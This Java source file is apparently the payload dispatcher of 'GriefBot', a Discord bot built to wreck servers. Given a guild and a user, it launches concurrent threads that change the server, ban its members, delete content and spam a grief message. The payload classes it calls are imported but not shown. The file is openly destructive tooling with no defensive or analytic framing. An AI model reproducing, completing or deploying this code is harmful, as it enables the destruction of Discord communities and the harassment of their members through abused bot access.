package de.corruptedbytes.payload;

import de.corruptedbytes.GriefBot;
import de.corruptedbytes.payload.impl.PayloadBanMembers;
import de.corruptedbytes.payload.impl.PayloadDelete;
import de.corruptedbytes.payload.impl.PayloadServerChange;
import de.corruptedbytes.payload.impl.PayloadSpam;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.User;

public class GriefBotPayload {

	private Guild guild;
	private User user;

	public GriefBotPayload(Guild guild, User user) {
		this.guild = guild;
		this.user = user;
	}
	
	
	public void start() {
		String griefMessage = null;
		
		if (GriefBot.getInstance().getGriefMessage().contains("%s")) 
			griefMessage = String.format(GriefBot.getInstance().getGriefMessage(), user.getName());
		else
			griefMessage = GriefBot.getInstance().getGriefMessage();
		
		runTask(new PayloadServerChange(guild, griefMessage));
		runTask(new PayloadBanMembers(guild));
		runTask(new PayloadDelete(guild, griefMessage));
		runTask(new PayloadSpam(guild, griefMessage));
	}
	
	private void runTask(Runnable runnable) {
		new Thread(runnable).start();
	}
}
